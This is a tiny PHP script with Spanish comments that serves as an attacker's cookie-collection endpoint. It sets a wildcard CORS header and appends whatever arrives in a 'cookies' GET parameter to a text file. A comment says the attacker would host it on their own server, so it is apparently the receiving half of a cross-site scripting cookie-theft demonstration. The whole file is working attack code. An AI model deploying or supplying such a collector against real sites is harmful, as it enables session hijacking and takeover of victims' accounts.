<?php
header('Access-Control-Allow-Origin: *');
#Guardar cookies recibidas en un archivo de texto
#Obviamente el atacante tendrá este código en un servidor propio
file_put_contents("cookies.txt", $_GET["cookies"] . PHP_EOL, FILE_APPEND);
?>